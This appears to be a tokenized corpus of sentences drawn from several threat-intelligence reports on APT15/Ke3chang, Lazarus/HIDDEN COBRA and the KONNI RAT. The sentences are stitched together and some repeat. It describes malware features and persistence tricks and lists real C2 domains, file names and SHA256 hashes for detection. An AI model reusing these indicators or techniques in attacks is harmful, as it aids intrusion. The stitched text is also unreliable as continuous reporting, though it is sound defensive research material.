MyWeb
"
malware
family
from
2010
to
2011
.
 
The
Ke3chang
attackers
used
the
older
MyWeb
malware
family
from
2010
to
2011
.
 
During
our
period
of
visibility
into
the
BS2005
"
moviestar
"
campaign
against
various
ministries
of
foreign
affairs
in
Europe
,
FireEye
discovered
that
the
Ke3chang
had
initially
tested
the
malware
in
virtual
machines
,
prior
to
compromising
actual
targets
.
 
The
MyWeb
sample
that
FireEye
analyzed
has
a
compile
date
of
1/20/2011
.
 
At
least
one
of
the
attacks
in
this
campaign
leveraged
a
European
security
and
defense-themed
lure
,
which
aligns
with
the
targeting
preferences
for
this
group
.
 
MyWeb
is
the
second-generation
malware
used
by
Ke3chang
.
 
ministries
of
foreign
affairs
in
Europe
have
been
targeted
and
compromised
by
a
threat
actor
we
call
Ke3chang
.
 
This
attack
used
the
crisis
in
Syria
as
a
lure
to
deliver
malware
to
its
targets
.
 
Tracking
the
malicious
activities
of
the
elusive
Ke3chang
APT
group
,
ESET
researchers
have
discovered
new
versions
of
malware
families
linked
to
the
group
,
and
a
previously
unreported
backdoor
.
 
Furthermore
,
FireEye
has
presented
evidence
indicating
that
the
Ke3chang
attackers
have
been
active
since
at
least
2010
and
have
attacked
targets
related
to
G20
meetings
in
the
past
.
 
During
our
brief
window
of
visibility
into
one
of
the
known
22
CnC
nodes
,
FireEye
observed
the
Ke3chang
conducting
reconnaissance
and
moving
laterally
throughout
the
compromised
networks
.
 
Ke3chang
attackers
are
operating
within
China
.
 
In
May
2017
,
NCC
Group
's
Incident
Response
team
reacted
to
an
ongoing
incident
.
 
which
provides
a
range
of
services
to
UK
Government
.
 
APT15
was
targeting
information
related
to
UK
government
departments
and
military
technology
.
 
backdoors
that
now
appear
to
be
part
of
APT15
's
toolset
.
 
This
report
demonstrates
that
Ke3chang
is
able
to
successfully
penetrate
government
targets
using
exploits
for
vulnerabilities
that
have
already
been
patched
and
despite
the
fact
that
these
ministries
have
defenses
in
place
.
 
RoyalDNS
-
required
APT15
.
 
The
Ke3chang
group
also
used
keyloggers
and
their
own
.NET
tool
to
enumerate
folders
and
dump
data
from
Microsoft
Exchange
mailboxes
.
 
APT15
was
also
observed
using
Mimikatz
to
dump
credentials
and
generate
Kerberos
golden
tickets
.
 
This
time
,
APT15
opted
for
a
DNS
based
backdoor
:
RoyalDNS
.
 
APT15
then
used
a
tool
known
as
RemoteExec
.
 
APT15
then
used
a
tool
known
as
RemoteExec
(
similar
to
Microsoft
.
 
Coincidentally
,
following
the
recent
hack
of
a
US
Navy
contractor
and
theft
of
highly
sensitive
data
on
submarine
warfare
,
we
have
found
evidence
of
very
recent
activity
by
a
group
referred
to
as
APT15
,
known
for
committing
cyber
espionage
which
is
believed
to
be
affiliated
with
the
Chinese
government
.
 
APT15
is
known
for
committing
cyberespionage
against
companies
and
organizations
located
in
many
different
countries
,
targeting
different
sectors
such
as
the
oil
industry
,
government
contractors
,
military
,
and
more
.
 
Other
names
for
the
group
are
Vixen
Panda
,
Ke3chang
,
Royal
APT
,
and
Playful
Dragon
.
 
ther
names
for
the
group
are
Vixen
Panda
,
Ke3chang
,
Royal
APT
,
and
Playful
Dragon
.
 
There
are
many
articles
and
researches
online
about
APT15
and
their
activities
,
the
most
recent
one
by
NCC
Group
.
 
There
are
many
articles
and
researches
online
about
APT15
and
their
activities
,
the
most
recent
one
by
NCC
Group
;
although
posted
in
March
2018
,
it
refers
to
a
campaign
in
2017
.
 
both
attributed
to
Chinese
government
affiliated
groups
.
 
DLL
hijacking
techniques
have
been
seen
in
the
past
with
the
APT15
group
.
 
cyber
actors
of
the
North
Korean
to
target
the
media
,
aerospace
,
financial
,
and
critical
infrastructure
sectors
in
the
United
States
and
globally
.
 
The
U.S.
Government
refers
to
the
malicious
cyber
activity
by
the
North
Korean
government
as
HIDDEN
COBRA
.
 
Tools
and
capabilities
used
by
HIDDEN
COBRA
actors
include
DDoS
botnets
,
keyloggers
,
remote
access
tools
(
RATs
)
,
and
wiper
malware
.
 
Variants
of
malware
and
tools
used
by
HIDDEN
COBRA
actors
include
Destover
and
Hangman
.
 
DHS
has
previously
released
Alert
TA14-353A
.
 
The
DeltaCharlie
DDoS
bot
was
originally
reported
by
Novetta
in
their
2016
Operation
Blockbuster
Malware
Report
.
 
Our
analysis
shows
that
the
cybercriminals
behind
the
attack
against
an
online
casino
in
Central
America
,
and
several
other
targets
in
late-2017
,
were
most
likely
the
infamous
Lazarus
hacking
group
.
 
The
Lazarus
Group
was
first
identified
in
Novetta
's
report
Operation
Blockbuster
in
February
2016
.
 
cyberattacks
against
high-value
targets
in
Ukraine
in
December
2015
and
December
2016
.
 
In
all
of
these
incidents
,
the
Lazarus
utilized
similar
toolsets
,
including
KillDisk
that
was
executed
on
compromised
machines
.
 
We
are
confident
this
KillDisk
malware
was
deployed
by
Lazarus
,
rather
than
by
another
,
unrelated
attacker
.
 
This
recent
attack
against
an
online
casino
in
Central
America
suggests
that
hacking
tools
from
the
Lazarus
toolset
are
recompiled
with
every
attack
(
we
didn't
see
these
exact
samples
anywhere
else
)
.
 
Utilizing
KillDisk
in
the
attack
scenario
most
likely
served
one
of
two
purposes
:
the
attackers
covering
their
tracks
after
an
espionage
operation
,
or
it
was
used
directly
for
extortion
or
cyber-sabotage
.
 
Today
we'd
like
to
share
some
of
our
findings
,
and
add
something
new
to
what
's
currently
common
knowledge
about
Lazarus
Group
activities
,
and
their
connection
to
the
much
talked
about
February
2016
incident
,
when
an
unknown
attacker
attempted
to
steal
up
to
$851M
USD
from
Bangladesh
Central
Bank
.
 
Since
the
Bangladesh
incident
there
have
been
just
a
few
articles
explaining
the
connection
between
Lazarus
Group
and
the
Bangladesh
bank
heist
.
 
However
,
from
this
it
's
only
clear
that
Lazarus
might
have
attacked
Polish
banks
.
 
Symantec
also
confirmed
seeing
the
Lazarus
wiper
tool
in
Poland
at
one
of
their
customers
.
 
Considering
that
the
afterhack
publications
by
the
media
mentioned
that
the
investigation
stumbled
upon
three
different
attackers
,
it
was
not
obvious
whether
Lazarus
was
the
one
responsible
for
the
fraudulent
SWIFT
transactions
,
or
if
Lazarus
had
in
fact
developed
its
own
malware
to
attack
banks
'
systems
.
 
We
would
like
to
add
some
strong
facts
that
link
some
attacks
on
banks
to
Lazarus
,
and
share
some
of
our
own
findings
as
well
as
shed
some
light
on
the
recent
TTPs
used
by
the
attacker
,
including
some
yet
unpublished
details
from
the
attack
in
Europe
in
2017
.
 
Lazarus
attacks
are
not
a
local
problem
and
clearly
the
group
's
operations
span
across
the
whole
world
.
 
Lazarus
was
previously
known
to
conduct
cyberespionage
and
cybersabotage
activities
,
such
as
attacks
on
Sony
Pictures
Entertainment
with
volumes
of
internal
data
leaked
,
and
many
system
harddrives
in
the
company
wiped
.
 
We
believe
that
Lazarus
Group
is
very
large
and
works
mainly
on
infiltration
and
espionage
operations
,
while
a
substantially
smaller
units
within
the
group
,
which
we
have
dubbed
Bluenoroff
,
is
responsible
for
financial
profit
.
 
Lazarus
regrouped
and
rushed
into
new
countries
,
selecting
mostly
poorer
and
less
developed
locations
,
hitting
smaller
banks
because
they
are
,
apparently
,
easy
prey
.
 
To
date
,
the
Lazarus
group
has
been
one
of
the
most
successful
in
launching
large
scale
operations
against
the
financial
industry
.
 
We
believe
that
Lazarus
will
remain
one
of
the
biggest
threats
to
the
banking
sector
,
finance
,
and
trading
companies
,
as
well
as
casinos
for
the
next
few
years
.
 
We
believe
Lazarus
started
this
watering
hole
attack
at
the
end
of
2016
after
their
other
operation
was
interrupted
in
South
East
Asia
.
 
We
believe
they
started
this
watering
hole
campaign
at
the
end
of
2016
after
their
other
operation
was
interrupted
in
South
East
Asia
.
 
A
rudimentary
but
somewhat
clever
design
,
KiloAlfa
provides
keylogging
capability
for
the
Lazarus
Group
's
collection
of
malicious
tools
.
 
The
design
of
KiloAlfa
is
broken
down
into
two
basic
components
:
the
persistence
functionality
and
the
keylogging
functionality
.
 
The
persistence
functionality
of
KiloAlfa
allows
the
malware
to
self-install
on
a
victim
's
machine
when
activated
(
described
below
)
.
 
Evidence
suggest
that
the
Lazarus
Group
uses
compromised
infrastructure
as
the
public-facing
touchpoint
for
the
majority
of
their
malware
samples
.
 
PapaAlfa
is
believed
to
be
one
of
the
proxy
malware
components
that
the
Lazarus
Group
uses
to
hide
the
true
command
and
control
server
for
operations
.
 
Rather
,
PapaAlfa
could
be
considered
a
smart
proxy
due
in
part
to
the
fact
that
the
Lazarus
can
easily
switch
the
backend
destination
address
and
PROT
without
having
to
reestablish
control
over
the
infected
machine
hosting
the
PapaAlfa
malware
.
 
In
terms
of
form
factor
,
PapaAlfa
comes
in
two
flavors
:
service
DLL
and
standalone
executable
.
 
The
IndiaBravo-PapaAlfa
installer
is
responsible
for
installing
the
service
DLL
variant
.
 
While
the
tools
profiled
in
this
report
are
not
inherently
malicious
,
their
capabilities
are
nonetheless
integral
to
the
Lazarus
Group
's
cyber
operations
,
both
espionage
and
destructive
in
nature
,
making
them
inherently
dangerous
to
potential
victims
.
 
These
tools
often
lay
the
groundwork
for
further
malicious
activity
,
such
as
the
targeting
of
antivirus
capabilities
and
the
disabling
of
firewalls
,
both
of
which
are
very
fundamental
defensive
measures
.
 
Furthermore
,
like
many
other
identified
Lazarus
Group
families
,
these
tools
showcase
the
group
's
creative
solutions
,
such
as
the
PapaAlfa
,
which
makes
it
difficult
to
immediately
identify
potentially
malicious
activity
on
a
compromised
network
.
 
The
first
class
,
colloquially
known
as
"
wipers
"
,
are
a
class
of
malware
has
the
primary
intent
of
destroying
data
on
a
victim
's
machine
.
 
DDoS
malware
floods
a
target
's
network-connected
service
with
an
excessive
number
of
request
at
once
in
order
to
overload
the
capacity
of
the
server
.
 
For
example
,
DeltaAlfa
specifies
a
DDoS
bot
family
identified
as
Alfa
.
 
The
naming
scheme
used
by
Novetta
for
the
malware
identified
during
Operation
Blockbuster
consists
of
at
least
two
identifiers
which
each
identifier
coming
from
the
International
Civil
Aviation
Organization
(
ICAO
)
's
phonetic
alphabet
,2
commonly
referred
to
as
the
NATO
phonetic
alphabet
.
 
Loaders
are
typically
responsible
for
loading
a
DLL
component
into
memory
given
that
a
DLL
cannot
operate
in
a
standalone
mode
such
as
an
executable
.
 
This
report
will
explore
the
various
installers
,
uninstallers
and
loaders
Novetta
has
observed
the
Lazarus
Group
using
.
 
This
reverse
engineering
report
looks
at
the
RATs
and
staging
malware
found
within
the
Lazarus
Group
's
collection
.
 
Regardless
of
their
sophistication
or
refinement
,
the
malware
families
within
the
Lazarus
Group
's
India
and
Lima
classes
perform
at
a
reasonable
level
for
their
designed
purpose
:
the
introduction
and
persistence
of
malware
from
the
Lazarus
Group
on
a
victim
's
infrastructure
.
 
While
the
capabilities
for
the
installers
,
loaders
,
and
uninstallers
in
this
report
are
relatively
straight
forward
and
single-focused
,
analysis
of
these
malware
families
provide
further
insight
into
the
capabilities
of
the
Lazarus
Group
.
 
The
Lazarus
Group
employs
a
variety
of
RATs
that
operate
in
both
client
mode
and
server
mode
.
 
The
most
common
communication
mode
for
a
RAT
is
to
act
as
a
client
to
a
remote
server
.
 
The
Lazarus
Group
employs
a
variety
of
RATs
and
staging
malware
to
conduct
cyber
operations
,
many
of
which
contain
significant
code
overlap
that
points
to
at
least
a
shared
development
environment
.
 
While
some
members
within
the
Romeo
and
Sierra
groups
may
not
implement
sound
authentication
strategies
,
shift
their
design
focus
in
abrupt
and
unusual
manners
,
and
fail
to
understand
the
pitfalls
of
distributed
command
networks
,
on
the
whole
the
families
within
the
Lazarus
Group
's
collection
of
RATs
and
staging
malware
perform
their
tasks
with
surprising
effectiveness
.
 
This
new
campaign
,
dubbed
HaoBao
,
resumes
Lazarus
'
previous
phishing
emails
,
posed
as
employee
recruitment
,
but
now
targets
Bitcoin
users
and
global
financial
organizations
.
 
This
new
campaign
,
dubbed
HaoBao
,
resumes
Lazarus
'
previous
phishing
emails
,
posed
as
employee
recruitment
,
but
now
targets
financial
organizations
.
 
McAfee
Advanced
Threat
Research
analysts
have
discovered
an
aggressive
Bitcoin-stealing
phishing
campaign
by
the
international
cybercrime
group
Lazarus
that
uses
sophisticated
malware
with
long-term
impact
.
 
McAfee
Advanced
Threat
Research
(
ATR
)
analysts
have
discovered
an
aggressive
Bitcoin-stealing
phishing
campaign
by
the
international
cybercrime
group
Lazarus
that
uses
sophisticated
malware
with
long-term
impact
.
 
Beginning
in
2017
,
the
Lazarus
group
heavily
targeted
individuals
with
spear
phishing
emails
impersonating
job
recruiters
which
contained
malicious
documents
.
 
The
use
of
decoy
documents
also
reveals
some
of
the
potential
targets
of
the
Lazarus
group
's
malicious
activity
,
specifically
the
use
spear
phishing
attacks
observed
targeting
South
Korean
government
and
aerospace
organizations
.
 
The
campaign
lasted
from
April
to
October
and
used
job
descriptions
relevant
to
target
organizations
,
in
both
English
and
Korean
language
.
 
The
Lazarus
Group
's
objective
was
to
gain
access
to
the
target
's
environment
and
obtain
key
military
program
insight
or
steal
money
.
 
In
this
latest
discovery
by
McAfee
,
despite
a
short
pause
in
similar
operations
,
the
Lazarus
group
targets
financial
organizations
.
 
This
campaign
is
tailored
to
identifying
those
who
are
running
Bitcoin
related
software
through
specific
system
scans
.
 
This
Malware
Analysis
Report
(
MAR
)
is
the
result
of
analytic
efforts
between
the
Department
of
Homeland
Security
(
DHS
)
and
the
Federal
Bureau
of
Investigation
(
FBI
)
.
 
When
victims
open
malicious
documents
attached
to
the
emails
,
the
malware
scans
for
Bitcoin
activity
and
then
establishes
an
implant
for
long-term
data-gathering
.
 
According
to
trusted
third-party
reporting
,
HIDDEN
COBRA
actors
have
likely
been
using
FALLCHILL
malware
since
2016
to
target
the
aerospace
,
telecommunications
,
and
finance
industries
.
 
The
malware
is
a
fully
functional
RAT
with
multiple
commands
that
the
actors
can
issue
from
a
command
and
control
(
C2
)
server
to
a
victim
's
system
via
dual
proxies
.
 
FALLCHILL
typically
infects
a
system
as
a
file
dropped
by
other
HIDDEN
COBRA
malware
or
as
a
file
downloaded
unknowingly
by
users
when
visiting
sites
compromised
by
HIDDEN
COBRA
actors
.
 
HIDDEN
COBRA
actors
use
an
external
tool
or
dropper
to
install
the
FALLCHILL
malware
to
establish
persistence
.
 
HIDDEN
COBRA
actors
install
the
FALLCHILL
malware
to
establish
persistence
.
 
Working
with
U.S.
government
partners
,
DHS
and
FBI
identified
Internet
Protocol
(
IP
)
addresses
and
other
indicators
of
compromise
(
IOCs
)
associated
with
a
remote
administration
tool
(
RAT
)
used
by
the
North
Korean
governmentcommonly
known
as
FALLCHILL
.
 
This
alert
's
IOC
files
provide
HIDDEN
COBRA
indicators
related
to
FALLCHILL
.
 
McAfee
Advanced
Threat
Research
analysts
have
uncovered
a
global
data
reconnaissance
campaign
assaulting
a
wide
number
of
industries
including
critical
infrastructure
,
entertainment
,
finance
,
health
care
,
and
telecommunications
.
 
Because
of
this
,
additional
HIDDEN
COBRA
malware
may
be
present
on
systems
compromised
with
FALLCHILL
.
 
This
campaign
,
dubbed
Operation
GhostSecret
,
leverages
multiple
implants
,
tools
,
and
malware
variants
associated
with
the
state-sponsored
cyber
group
HIDDEN
COBRA
.
 
From
March
18
to
26
we
observed
the
malware
operating
in
multiple
LOCs
of
the
world
.
 
Furthermore
,
the
Advanced
Threat
Research
team
has
discovered
Proxysvc
,
which
appears
to
be
an
undocumented
implant
.
 
Our
investigation
into
this
campaign
reveals
that
the
actor
used
multiple
malware
implants
,
including
an
unknown
implant
with
capabilities
similar
to
Bankshot
.
 
The
attackers
behind
Operation
GhostSecret
used
a
similar
infrastructure
to
earlier
threats
,
including
SSL
certificates
used
by
FakeTLS
in
implants
found
in
the
Destover
backdoor
variant
known
as
Escad
,
which
was
used
in
the
Sony
Pictures
attack
.
 
Based
on
our
analysis
of
public
and
private
information
from
submissions
,
along
with
product
telemetry
,
it
appears
Proxysvc
was
used
alongside
the
2017
Destover
variant
and
has
operated
undetected
since
mid-2017
.
 
This
new
variant
resembles
parts
of
the
Destover
malware
,
which
was
used
in
the
2014
Sony
Pictures
attack
.
 
The
Lazarus
used
a
similar
infrastructure
to
earlier
threats
,
including
the
Destover
backdoor
variant
known
as
Escad
.
 
The
McAfee
Advanced
Threat
Research
team
discovered
a
previously
unknown
data-gathering
implant
that
surfaced
in
mid-February
2018
.
 
The
Advanced
Threat
Research
team
uncovered
activity
related
to
this
campaign
in
March
2018
,
when
the
actors
targeted
Turkish
banks
.
 
KONNI
:
A
Malware
Under
The
Radar
For
Years
.
 
Talos
has
discovered
an
unknown
Remote
Administration
Tool
that
we
believe
has
been
in
use
for
over
3
years
.
 
During
this
time
it
has
managed
to
avoid
scrutiny
by
the
security
community
.
 
The
current
version
of
the
malware
allows
the
operator
to
steal
files
,
keystrokes
,
perform
screenshots
,
and
execute
arbitrary
code
on
the
infected
host
.
 
Talos
has
named
this
malware
KONNI
.
 
Throughout
the
multiple
campaigns
observed
over
the
last
3
years
,
the
actor
has
used
an
email
attachment
as
the
initial
infection
vector
.
 
They
then
use
additional
social
engineering
to
prompt
the
target
to
open
a
.scr
file
,
display
a
decoy
document
to
the
users
,
and
finally
execute
the
malware
on
the
victim's
machine
.
 
The
malware
infrastructure
of
the
analysed
samples
was
hosted
by
a
free
web
hosting
provider:
000webhost
.
 
The
malware
has
evolved
over
time
.
 
In
this
article
,
we
will
analyse
this
evolution:
at
the
beginning
the
malware
was
only
an
information
stealer
without
remote
administration
,
it
moved
from
a
single
file
malware
to
a
dual
file
malware
(an
executable
and
a
dynamic
library
)
,
the
malware
has
supported
more
and
more
features
over
the
time
,
the
decoy
documents
have
become
more
and
more
advanced
.
 
The
different
versions
contain
copy/pasted
code
from
previous
versions
.
 
Moreover
the
new
version
searches
for
files
generated
by
previous
versions
.
 
This
evolution
is
illustrated
across
4
campaigns
:
one
in
2014
,
one
in
2016
and
finally
two
in
2017
.
 
The
decoy
document
of
the
2
last
campaigns
suggests
that
the
targets
are
public
organisations
.
 
Both
documents
contained
email
addresses
,
phone
numbers
and
contacts
of
members
of
official
organizations
such
as
United
Nations
,
UNICEF
,
and
Embassies
linked
to
North
Korea
.
 
In
this
campaign
,
the
dropper
filename
was
beauty.scr
.
 
Based
on
the
compilation
date
of
the
two
binaries
,
this
campaign
took
place
in
September
2014
.
 
Once
executed
,
two
files
were
dropped
on
the
targeted
system
:
a
decoy
document
(a
picture)
and
a
fake
svchost.exe
binary
.
 
Both
files
were
stored
in
"C:\Windows"
.
 
The
fake
svchost
binary
is
the
KONNI
malware
.
 
The
first
task
of
the
malware
is
to
generate
an
ID
to
identify
the
infected
system
.
 
This
ID
is
generated
based
on
the
installation
date
of
the
system
.
 
The
second
task
of
malware
is
to
ping
the
CC
and
get
orders
.
 
The
malware
includes
2
domains:
phpschboy.prohosts.org
,
jams481.site.bz
.
 
The
developer
used
the
Microsoft
Winsocks
API
to
handle
the
network
connection
.
 
Surprisingly
,
this
isn't
the
easiest
or
the
most
efficient
technical
choice
for
HTTP
connection
.
 
The
malware
samples
we
analysed
connected
to
only
one
URI:
<c2-domain>/login.php
.
 
This
version
of
KONNI
is
not
designed
to
execute
code
on
the
infected
system
.
 
The
purpose
is
to
be
executed
only
once
and
steal
data
on
the
infected
system
,
here
are
the
main
features
:
Keyloggers
,
Clipboard
stealer
,
Firefox
profiles
and
cookies
stealer
,
Chrome
profiles
and
cookies
stealer
,
Opera
profiles
and
cookies
stealer
.
 
The
name
of
the
.scr
file
was
directly
linked
to
tension
between
North
Korea
and
USA
in
March
2016
more
information
.
 
Based
on
the
compilation
dates
of
the
binaries
,
the
campaign
took
place
in
the
same
period
.
 
An
interesting
fact
:
the
dropped
library
was
compiled
in
2014
and
appears
in
our
telemetry
in
August
2015
.
 
Indicating
that
this
library
was
probably
used
in
another
campaign
.
 
The
.scr
file
contains
2
Office
documents
.
 
The
first
document
was
in
English
and
a
second
in
Russian
.
 
In
the
sample
only
the
English
version
can
be
displayed
to
the
user
(that
is
hardcoded
in
the
sample)
.
 
The
Russian
document
is
not
used
by
the
sample
,
we
assume
that
the
author
of
the
malware
forgot
to
remove
the
resource
containing
the
Russia
decoy
document
.
 
The
malware
author
changed
the
malware
architecture
,
this
version
is
divided
in
two
binaries:
conhote.dll
,
winnit.exe
.
 
Another
difference
is
the
directory
where
the
files
are
dropped
,
it's
no
longer
C:\Windows
but
rather
the
local
setting
of
the
current
user
(%USERPROFILE%\Local
Settings\winnit\winnit.exe)
.
 
Thanks
to
this
modification
,
the
malware
can
be
executed
with
a
non-administrator
account
.
 
The
.dll
file
is
executed
by
the
.exe
file
.
 
In
this
version
,
a
shortcut
is
created
in
order
to
launch
winnit.exe
in
the
following
path
%USERPROFILE%\Start
Menu\Programs\Startup\Anti
virus
service.lnk
.
 
As
you
can
see
the
attacker
has
went
to
great
lengths
to
disguise
his
service
as
a
legitimate
Antivirus
Service
by
using
the
name
'Anti
virus
service.lnk'
.
 
This
is
of
course
simple
but
often
it
can
be
enough
for
a
user
to
miss
something
malicious
by
name
.
 
As
in
the
previous
version
,
the
ID
of
the
infected
system
is
generated
with
exactly
the
same
method
.
 
The
C2
is
different
and
the
analysed
version
this
time
only
contains
a
single
domain:
dowhelsitjs.netau.net
.
 
In
this
version
,
the
developer
used
a
different
API
,
the
Wininet
API
which
make
more
sense
for
Web
requests
.
 
Moreover
the
C2
infrastructure
evolved
too
,
more
.php
files
are
available
through
the
web
hosting:
<c2-domain>/login.php
<c2-domain>/upload.php
<c2-domain>/download.php
.
 
This
version
includes
the
stealer
features
mentioned
in
the
previous
version
and
additionally
Remote
Administration
Tool
features
such
as
file
uploading/download
and
arbitrary
command
execution
.
 
The
library
is
only
used
to
perform
keylogging
and
clipboard
stealing
.
 
Indeed
,
the
malware
author
moved
this
part
of
the
code
from
the
core
of
the
malware
to
a
library
.
 
An
interesting
element
is
that
the
malware
looks
for
filenames
created
with
the
previous
version
of
KONNI
.
 
This
implies
that
the
malware
targeted
the
same
people
as
the
previous
version
and
they
are
designed
to
work
together
.
 
The
malware
internally
uses
the
following
files
:
solhelp.ocx
sultry.ocx
helpsol.ocx
psltre.ocx
screentmp.tmp
(log
file
of
the
keylogger)
spadmgr.ocx
apsmgrd.ocx
wpg.db
.
 
In
this
campaign
,
the
malware
author
uses
the
following
name:
Pyongyang
Directory
Group
email
April
2017
RC_Office_Coordination_Associate.scr.
The
decoy
document
shown
after
infection
is
an
Office
document
containing
email
addresses
,
phone
numbers
and
contacts
of
members
of
official
organizations
such
as
the
United
Nations
,
UNICEF
,
Embassies
linked
to
North
Korea
.
 
The
.scr
files
drops
two
files:
an
executable
and
a
library
.
 
As
in
the
previous
version
,
the
persistence
is
achieved
by
a
Windows
shortcut
(in
this
case
adobe
distillist.lnk
)
.
 
Contrary
to
the
previous
version
,
the
developers
moved
the
core
of
malware
to
the
library
.
 
The
executable
performs
the
following
tasks:
If
the
system
is
a
64-bit
version
of
Windows
,
it
downloads
and
executes
a
specific
64-bit
version
of
the
malware
thanks
to
a
powershell
script
.
 
Loading
the
dropped
library
.
 
The
library
contains
the
same
features
as
the
previous
version
as
well
as
new
ones
.
 
This
version
of
KONNI
is
the
most
advanced
with
better
coding
.
 
The
malware
configuration
contains
one
Command
and
Control:
pactchfilepacks.net23.net
.
 
A
new
URI
is
available:
<c2-domain>/uploadtm.php
.
 
This
URI
is
used
with
a
new
feature
implemented
in
this
version:
the
malware
is
able
to
perform
screenshot
(thanks
to
the
GDI
API)
and
uploads
it
thank
to
this
URL
.
 
The
malware
checks
if
a
file
used
on
a
previous
version
of
KONNI
is
available
on
the
system
.
 
Here
is
the
complete
list
of
files
internally
used
by
the
RAT:
error.tmp
(the
log
file
of
the
keylogger)
tedsul.ocx
helpsol.ocx
trepsl.ocx
psltred.ocx
solhelp.ocx
sulted.ocx
.
 
The
handling
of
instructions
has
improved
too
.
 
Here
are
the
7
actions
that
the
infected
machine
can
be
instructed
to
perform:
Delete
a
specific
file
.
 
Upload
a
specific
file
based
on
a
filename
.
 
Upload
a
specific
file
based
on
the
full
path
name
.
 
Create
a
screenshot
and
uploads
it
on
the
C2
.
 
Get
system
information
.
 
Download
a
file
from
the
Internet
.
 
Execute
a
command
.
 
When
the
attacker
wants
to
gather
information
on
the
infected
system
(action
5)
,
it
retrieves
the
following
information:
Hostname
IP
address
Computer
name
Username
name
Connected
drive
OS
version
Architecture
Start
menu
programs
Installed
software
.
 
The
last
identified
campaign
where
KONNI
was
used
was
named
Inter
Agency
List
and
Phonebook
-
April
2017
RC_Office_Coordination_Associate.scr
.
 
This
file
drops
exactly
the
same
files
than
the
previous
campaign
but
the
decoy
document
is
different
.
 
This
document
contains
the
name
,
phone
number
and
email
address
of
members
of
agencies
,
embassies
and
organizations
linked
to
North
Korea
.
 
The
analysis
shows
us
the
evolution
of
KONNI
over
the
last
3
years
.
 
The
last
campaign
was
started
a
few
days
ago
and
is
still
active
.
 
The
infrastructure
remains
up
and
running
at
the
time
of
this
post
.
 
The
RAT
has
remained
under
the
Radar
for
multiple
years
.
 
An
explanation
could
be
the
fact
that
the
campaign
was
very
limited
nature
,
which
does
not
arouse
suspicion
.
 
This
investigation
shows
that
the
author
has
evolved
technically
(by
implementing
new
features)
and
in
the
quality
of
the
decoy
documents
.
 
The
campaign
of
April
2017
used
pertinent
documents
containing
potentially
sensitive
data
.
 
Moreover
the
metadata
of
the
Office
document
contains
the
names
of
people
who
seems
to
work
for
a
public
organization
.
 
We
don't
know
if
the
document
is
a
legitimate
compromised
document
or
a
fake
that
the
attacker
has
created
in
an
effort
to
be
credible
.
 
Clearly
the
author
has
a
real
interest
in
North
Korea
,
with
3
of
the
4
campaigns
are
linked
to
North
Korea
.
 
Additional
ways
our
customers
can
detect
and
block
this
threat
are
listed
below
.
 
Advanced
Malware
Protection
(
AMP
)
is
ideally
suited
to
prevent
the
execution
of
the
malware
used
by
these
threat
actors
.
 
CWS
or
WSA
web
scanning
prevents
access
to
malicious
websites
and
detects
malware
used
in
these
attacks
.
 
Email
Security
can
block
malicious
emails
sent
by
threat
actors
as
part
of
their
campaign
.
 
The
Network
Security
protection
of
IPS
and
NGFW
have
up-to-date
signatures
to
detect
malicious
network
activity
by
threat
actors
.
 
AMP
Threat
Grid
helps
identify
malicious
binaries
and
build
protection
into
all
Cisco
Security
products
.
 
Umbrella
,
our
secure
internet
gateway
(SIG)
,
blocks
users
from
connecting
to
malicious
domains
,
IPs
,
and
URLs
,
whether
users
are
on
or
off
the
corporate
network
.
 
SHA256
:
413772d81e4532fec5119e9dce5e2bf90b7538be33066cf9a6ff796254a5225f
.
 
Filename:
beauty.scr
.
 
SHA256
:
eb90e40fc4d91dec68e8509056c52e9c8ed4e392c4ac979518f8d87c31e2b435
.
 
Filename:
C:\Windows\beauty.jpg
.
 
File
type:
JPEG
image
data
,
JFIF
standard
1.02
.
 
SHA256
:
44150350727e2a42f66d50015e98de462d362af8a9ae33d1f5124f1703179ab9
.
 
Hilename:
C:\Windows\svchost.exe
.
 
File
type:
PE32
executable
(GUI)
Intel
80386
,
for
MS
Windows
.
 
phpschboy.prohosts.org
.
 
jams481.site.bz
.
 
SHA256
:
94113c9968db13e3412c1b9c1c882592481c559c0613dbccfed2fcfc80e77dc5
.
 
Filename:
How
can
North
Korean
hydrogen
bomb
wipe
out
Manhattan.scr
.
 
SHA256
:
56f159cde3a55ae6e9270d95791ef2f6859aa119ad516c9471010302e1fb5634
.
 
Filename:
conhote.dll
.
 
SHA256
:
553a475f72819b295927e469c7bf9aef774783f3ae8c34c794f35702023317cc
.
 
Filename:
winnit.exe
.
 
SHA256
:
92600679bb183c1897e7e1e6446082111491a42aa65a3a48bd0fceae0db7244f
.
 
Filename:
Anti
virus
service.lnk
.
 
dowhelsitjs.netau.net
.
 
SHA256
:
69a9d7aa0cb964c091ca128735b6e60fa7ce028a2ba41d99023dd57c06600fe0
.
 
Filename:
Pyongyang
Directory
Group
email
April
2017.RC_Office_Coordination_Associate.scr
.
 
SHA256
:
4585584fe7e14838858b24c18a792b105d18f87d2711c060f09e62d89fc3085b
.
 
Filename:
adobe
distillist.lnk
.
 
SHA256
:
39bc918f0080603ac80fe1ec2edfd3099a88dc04322106735bc08188838b2635
.
 
Filename:
winload.exe
.
 
SHA256
:
dd730cc8fcbb979eb366915397b8535ce3b6cfdb01be2235797d9783661fc84d
.
 
Filename:
winload.dll
.
 
Pactchfilepacks.net23.net
.
 
checkmail.phpnet.us
.
 
Lazarus
used
watering
hole
attacks
to
compromise
legitimate
and
trusted
websites
frequently
visited
by
their
targets
.
 
Malefactors
used
watering
hole
attacks
to
compromise
legitimate
and
trusted
websites
frequently
visited
by
their
targets
.
 
Feedback
from
our
Smart
Protection
Network
revealed
that
apart
from
attacks
in
North
America
(
mainly
the
U.S.
)
,
Europe
,
and
South
America
,
the
campaign
also
noticeably
affected
enterprises
in
Taiwan
,
Hong
Kong
,
China
,
and
Bahrain
.
 
On
February
28
,
the
McAfee
discovered
that
the
cybercrime
group
HIDDEN
COBRA
continues
to
target
cryptocurrency
and
financial
organizations
.
 
On
February
28
,
the
McAfee
Advanced
Threat
Research
team
discovered
that
the
cybercrime
group
HIDDEN
COBRA
continues
to
target
cryptocurrency
and
financial
organizations
.
 
While
the
URL
acts
similarly
to
how
eye-watch.in
:
443
delivers
payloads
,
we
also
saw
the
URL
leveraging
and
exploiting
security
flaws
in
Flash
:
CVE-2015-8651
,
CVE-2016-1019
,
and
CVE-2016-4117
.
 
In
this
analysis
,
we
observed
the
return
of
HIDDEN
COBRA
's
Bankshot
malware
implant
surfacing
in
the
Turkish
financial
system
.
 
In
this
new
,
aggressive
campaign
we
see
a
return
of
the
Bankshot
implant
,
which
last
appeared
in
2017
.
 
This
attack
resembles
previous
attacks
by
HIDDEN
COBRA
